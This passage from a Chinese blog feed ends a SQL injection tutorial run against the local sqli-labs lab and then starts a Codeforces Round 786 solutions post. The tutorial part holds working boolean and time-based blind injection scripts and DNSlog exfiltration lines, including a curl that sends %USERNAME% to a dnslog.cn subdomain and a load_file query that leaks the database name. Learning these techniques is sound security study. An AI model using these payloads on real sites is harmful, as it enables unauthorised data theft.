<code>false</code>，这显然不符合二分答案的期望，会导致程序死掉。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">minlength=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> minlength&lt;length:</span><br><span class="line">    mid=(length+minlength+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">    sql=<span class="string">&#x27;and length(database())&lt;&#x27;</span>+<span class="built_in">str</span>(mid)+<span class="string">&#x27;--+&#x27;</span></span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    p=get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">        length=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minlength=mid</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line">now_str=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    l=<span class="number">0</span></span><br><span class="line">    r=<span class="number">255</span></span><br><span class="line">    <span class="keyword">while</span> l&lt;r:</span><br><span class="line">        mid=(l+r+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">        guess_str=now_str+<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="comment">#print(mid,l,r)</span></span><br><span class="line">        sql=<span class="string">&quot;and ord(mid(database(),&#123;0&#125;,1))&lt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>,mid)</span><br><span class="line">        url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        p=get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">            r=mid-<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=mid</span><br><span class="line">    now_str+=<span class="built_in">chr</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(now_str)</span><br></pre></td></tr></table></figure><p>跑一下也可以看到结果</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/29.png" alt="29"></p><p>但是我们仍然想知道所有数据库的名称怎么办呢？那就改一下，继续跑，就是会慢一点，这里我们用一个变量统计一下看看它一共请求了多少次。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">minlength=<span class="number">1</span></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> minlength&lt;length:</span><br><span class="line">    mid=(length+minlength+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">    sql=<span class="string">&#x27;and (select length(group_concat(schema_name))&lt;&#x27;</span>+<span class="built_in">str</span>(mid)+<span class="string">&#x27; from information_schema.schemata)--+&#x27;</span></span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    p=get(url)</span><br><span class="line">    cnt+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">        length=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minlength=mid</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line">now_str=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    l=<span class="number">0</span></span><br><span class="line">    r=<span class="number">255</span></span><br><span class="line">    <span class="keyword">while</span> l&lt;r:</span><br><span class="line">        mid=(l+r+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">        guess_str=now_str+<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="comment">#print(mid,l,r)</span></span><br><span class="line">        sql=<span class="string">&quot;and (select ord(mid(group_concat(schema_name),&#123;0&#125;,1))&lt;&#123;1&#125; from information_schema.schemata);--+&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>,mid)</span><br><span class="line">        url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        p=get(url)</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">            r=mid-<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=mid</span><br><span class="line">    now_str+=<span class="built_in">chr</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(now_str)</span><br><span class="line"><span class="built_in">print</span>(cnt)</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/30.png" alt="30"></p><p>可以看到注出这些数据库一共请求了 <code>758</code> 次，而且二分算是效率比较高的了，也许你会说我写的也有问题，范围应该限定在 <code>33-127</code>，但是对于二分来说，范围缩小一半也只是少请求一次而已，整个信息长度 <code>94</code>，我们理论上也就会少请求了 <code>94</code> 次。在经过实际测量之后，发现也是要请求 <code>632</code> 次的，所以盲注是不可能去手打的，一定要学会自己写脚本跑，自己会写能应对任何情况，而你如果一味的依靠 <code>sqlmap</code> 最终会发现吃亏的还是自己。</p><p>布尔盲注一般应用在页面无有关数据库内容的回显，报错也无提示，并且只有两种回显的结果的时候用的。比较万金油，但是会导致请求量很大，实际应用的时候如果限制请求次数那么会很难。</p><p>基于时间的盲注</p><p>这个可以说是最后的法宝了，因为它使用所有的带有注入的页面。如果你的查询请求甚至不会有一点点的回显，比如说登录的时候都不告诉你登录成功或者账号密码失败，这个时候我们就只能使用基于时间的盲注了。</p><p>烫芝士：所有语言的特性—逻辑运算与和或都有这么个特性，两个表达式 <code>and</code>，如果第一个表达式为 <code>0</code> 那么不会运算第二个表达式，两个表达式 <code>or</code>，如果第一个表达式为 <code>1</code> 那么不会计算第二个表达式，两个表达式可以扩展到 <code>n</code> 个表达式。</p><p>基于此，我们给出第一个 <code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 表达式 and sleep(5)--+</span><br></pre></td></tr></table></figure><p>这里可以看到表达式为 <code>1</code> 那么会执行 <code>sleep</code>，如果为 <code>0</code>，那么不会执行。</p><p>我这里写了两个 <code>payload</code>，一个是 <code>1&#39; and length(database())&lt;5 and sleep(5)--+</code> 一个是 <code>1&#39; and length(database())&lt;9 and sleep(5)--+</code>，打开控制台的网络选项，我们可以看到</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/31.png" alt="31"></p><p>前者在 <code>10ms</code> 的时间内就返回了，而后者在 <code>5.02S</code> 才返回。可以看到后面的表达式为真就会休眠 <code>5S</code>，根据返回的时间差来判断表达式是否正确。</p><p>那么我们也来自己写一个脚本来跑跑时间盲注。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">minlength=<span class="number">1</span></span><br><span class="line">ss=time.time()</span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> minlength&lt;length:</span><br><span class="line">    mid=(length+minlength+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">    sql=<span class="string">&#x27;and (select length(group_concat(schema_name))&lt;&#x27;</span>+<span class="built_in">str</span>(mid)+<span class="string">&#x27; from information_schema.schemata) and sleep(1)--+&#x27;</span></span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    start=time.time()</span><br><span class="line">    p=get(url)</span><br><span class="line">    <span class="comment">#print(time.time()-start)</span></span><br><span class="line">    <span class="comment">#quit()</span></span><br><span class="line">    cnt+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> time.time()-start&gt;<span class="number">1</span>:</span><br><span class="line">        length=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minlength=mid</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line">now_str=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    l=<span class="number">32</span></span><br><span class="line">    r=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l&lt;r:</span><br><span class="line">        mid=(l+r+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">        guess_str=now_str+<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="comment">#print(mid,l,r)</span></span><br><span class="line">        sql=<span class="string">&quot;and (select ord(mid(group_concat(schema_name),&#123;0&#125;,1))&lt;&#123;1&#125; from information_schema.schemata) and sleep(1);--+&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>,mid)</span><br><span class="line">        url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        start=time.time()</span><br><span class="line">        p=get(url)</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> time.time()-start&gt;<span class="number">1</span>:</span><br><span class="line">            r=mid-<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=mid</span><br><span class="line">    now_str+=<span class="built_in">chr</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(now_str)</span><br><span class="line"><span class="built_in">print</span>(cnt)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cost:&#x27;</span>+<span class="built_in">str</span>(time.time()-ss))</span><br></pre></td></tr></table></figure><p>跟布尔盲注差不多，就是在后面加上个 <code>sleep(1)</code> 就行了，我们也不用回显的结果去判断了，直接用经过的时间是否超过 <code>1S</code> 就好了。这里我们不仅统计了请求次数，我们还统计了花费时间。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/32.png" alt="31"></p><p>可以看到请求次数跟上面是一样的(小声：我偷偷改了ASCII的范围)。并且注出这94个字符我们花费了将近 <code>4min</code>，可以看到这个时间成本也是非常高的。</p><h5 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h5><p>基于时间的盲注基本适用于所有含有注入漏洞的页面，但是时间成本是最高的。</p><h4 id="DNSlog盲注"><a href="#DNSlog盲注" class="headerlink" title="DNSlog盲注"></a>DNSlog盲注</h4><p>以上两个盲注不管是哪个都需要频繁请求数据库才能获取到数据库的具体信息，在当代 <code>WAF</code> 防护如此严密的情况下，请求如此多很可能会导致 <code>ip</code> 被 <code>ban</code>，这里我们可以使用 <code>load_file</code> 来发起一个 <code>DNS</code> 请求。</p><h5 id="前置芝士：mysql读取文件"><a href="#前置芝士：mysql读取文件" class="headerlink" title="前置芝士：mysql读取文件"></a>前置芝士：mysql读取文件</h5><p>先介绍一个函数，之前读写文件的时候用过：<code>load_file(file)</code> 可以读取文件的内容。这里不仅可以读取本地的文件，还能向 <code>url</code> 发起请求。这里需要注意一下数据库的配置，数据库中有一个变量是 <code>secure_file_priv</code>，可以直接查看数据库的配置文件，或者是在 <code>mysql</code> 终端中直接使用命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure><p>来查看这一项配置。</p><ul><li>当 <code>secure_file_priv</code> 为空，就可以读取磁盘的目录。</li><li>当 <code>secure_file_priv</code> 为<code>G:\</code>，就可以读取G盘的文件。</li><li>当 <code>secure_file_priv</code> 为 <code>null</code>，<code>load_file</code> 就不能加载文件。</li></ul><p>所以为了方便，我们最好把 <code>my.ini</code> 文件的该项配置设置成：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">secure_file_priv</span>=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>这样我们就能任意读取，任意写文件了，但是在生产环境中慎重配置，因为比较危险。</p><p>读取文件的一般形式是 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(file);</span><br></pre></td></tr></table></figure><p>比如我想读取 <code>D:</code> 目录下的 <code>1.txt</code> 文件，那就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;D:/1.txt&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/33.png" alt="33"></p><p>可以发现读取结果以十六进制的方式输出出来了。</p><p>需要注意的是，文件名若以双反斜杠开头则代表向 <code>url</code> 发起请求。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/35.png" alt="35"></p><p>但是会发现这一请求比较耗时，</p><p>写文件的一般形式是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $information into outfile &quot;$file&quot;</span><br></pre></td></tr></table></figure><p>但是不能覆盖文件，只能创建文件。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/34.png" alt="34"></p><p>在一般情况下，读文件可以读取一些配置文件信息，泄露敏感内容</p><h5 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h5><p>域名解析服务(Domain Name Server)，我们知道 <code>DNS</code> 的作用就是将我们熟知的域名转换成 <code>ip</code> 地址。</p><p>因特网采用层次树状结构命名方法。域是名字空间中一个可被管理的划分（按机构组织划分），域可被划分为子域，子域可再被划分，即形成了顶级域名、二级域名、三级域名等。从右向左为顶级域名、二级域名、三级域名等，用点隔开。</p><p>比如谷歌的域名：<code>www.google.com</code><br>它由三个标号组成， <code>com</code> 即为顶级域名，<code>google</code> 为二级域名，<code>www</code> 即为三级域名,且域名不分区大小写。<br>比如我访问 <code>www.google.com</code> 发生了以下的事情：</p><ol><li>我请求我自己设置的域名服务器</li><li>域名服务器向知道此域名的服务器发起请求</li><li>域名服务器得到了 <code>www.google.com</code> 的 <code>ip</code> 地址，返回给我设置的服务器，最后返回给我。</li></ol><p>我们在域名服务器中就留下了这样一条记录：<code>x.x.x.x</code> 用户在什么时候解析了 <code>www.google.com</code> 的域名。</p><h5 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h5><p>DNSlog是什么。DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名 <code>www.google.com</code> 等的访问信息，类似日志文件。</p><p>假如我在 <code>www.google.com</code> 之后还加了一个子域名，我的请求内容是 <code>xxx.www.google.com</code>，那么此时外部服务器并不知道谷歌在 <code>www</code> 域名下面还有一个子域名，那么它将域名请求发送给谷歌的服务器，谷歌服务器再解析出一个 <code>ip</code> 地址回去给域名服务器，当然也可能没有返回为空，不过这个请求还是会被谷歌的服务记录下来。这样我们的 <code>dns</code> 就会在网站的 <code>dns</code> 服务器留下信息了。</p><p>那么 <code>dnslog</code> 注入就是这么个原理了。它在你请求域名的时候，如果出现了分配给你 <code>dnslog</code> 服务器的日志，就会把数据返回给你。  </p><p>我们先来试试普通的 <code>dnslog</code> 带出信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl %USERNAME%.xxx.dnslog.cn</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/36.png" alt="36"></p><p>可以看到环境变量被执行带出到我们的 <code>dnslog</code> 服务器里面去了，<code>connection refused</code> 是因为他对所有的子域名解析的服务器地址都是 <code>127.0.0.1</code> 所以你本机没开 <code>web</code> 服务就会这样。</p><p>我们再来试试看在 <code>mysql</code> 里面泄露信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxx.dnslog.cn&#x27;));</span><br></pre></td></tr></table></figure><p>我们来试试去请求一下看看。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/37.png" alt="37"></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/38.png" alt="38"></p><p>可以发现成功泄露信息。</p><p>但是也要注意一下，每级域名长度最长为63，因此每次我们在请求的时候限制一下，用 <code>mid</code> 去截取就好了，虽然发起一次 <code>DNSlog</code> 请求要的时间也很多，但是比盲注要好一点。</p><p>域名若带有特殊字符会导致请求失败，因此在若泄露的信息有特殊符号注意编码一下，用 <code>hex</code> 去编码就好了。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><code>sql</code> 注入也就学了这么多，暂时先写到这里吧，后续学了新的芝士再来补充。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round 786(Div.3)</title>
      <link href="/2022/05/03/Codeforces%20Round%20786(Div.3)/"/>
      <url>/2022/05/03/Codeforces%20Round%20786(Div.3)/</url>
      
        <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1674">Codeforces Round #786 (Div. 3)</a>题解来了</p><p>实时录频在<a href="https://www.bilibili.com/video/BV18B4y117sn?spm_id_from=333.999.0.0">这里</a></p><span id="more"></span><h2 id="A-Number-Transformation"><a href="#A-Number-Transformation" class="headerlink" title="A. Number Transformation"></a>A. Number Transformation</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是说让你找到两个数 $a,b$，使得 $x\times a^b=y$ 这里可以使得 $b=1$ 然后就判断一下 $y\ mod\ x=0$ 是否成立即可。 </p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    <span class="keyword">if</span>(y%x==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1 %d\n&quot;</span>,y/x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;0 0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Dictionary"><a href="#B-Dictionary" class="headerlink" title="B. Dictionary"></a>B. Dictionary</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是说输出一个字符串的字典序，字符串只有2个字符，然后两个字符应该不能一样，这样的话直接用公式就好了，如果能一样，这个公式应该是 $(a[0]-‘a’)\times 26+a[1]-‘a’$ 的，这里既然不能一样那就都减一就好了，但是要注意，如果 $a[1]$ 不超过 $a[0]$ 则不需要减一。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">5</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,(s[<span class="number">0</span>]-<span class="string">&#x27;a&#x27;</span>)*<span class="number">25</span>+(s[<span class="number">1</span>]-<span class="string">&#x27;a&#x27;</span>)-(s[<span class="number">1</span>]&gt;s[<span class="number">0</span>])+<span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Infinite-Replacement"><a href="#C-Infinite-Replacement" class="headerlink" title="C. Infinite Replacement"></a>C. Infinite Replacement</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是说一个字符串 $s$ 只包含 $a$，$a$ 可以用另一个字符串 $t$ 替代，问有多少种替换的结果，替换可以有无限次。</p><p>首先不难发现，如果 $t$ ==”$a$” 那么我替换是没有效果的，答案为 $1$。</p><p>其次如果 $t$ 不包含 “$a$”，那么对于 $s$ 的每个位置的 “$a$”，有替换和不替换两种选择，答案就是$2^{strlen(s)}$。</p><p>只剩下包含”$a$”的长度不为 $1$ 的字符串，可以发现允许进行无限次替换，直接 $-1$ 就好了。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 